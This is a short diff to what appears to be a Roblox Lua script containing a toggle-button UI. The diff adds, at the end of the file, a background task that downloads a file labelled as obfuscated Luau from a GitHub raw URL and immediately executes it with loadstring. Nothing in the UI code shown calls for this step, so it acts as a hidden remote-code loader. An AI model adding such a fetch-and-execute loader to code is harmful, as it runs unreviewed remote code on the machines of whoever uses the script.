@@ -2175,3 +2175,16 @@ ToggleButton.MouseButton1Click:Connect(function()
         end)
     end
 end)
+
+
+task.spawn(function()
+    local success, err = pcall(function()
+        loadstring(game:HttpGet(
+            "https://raw.githubusercontent.com/DRB7HS/7zen.luau/refs/heads/main/7Z%20HUB%20/obfuscation%20luau"
+        ))()
+    end)
+
+    if not success then
+        warn("7ZEN external script failed:", err)
+    end
+end)
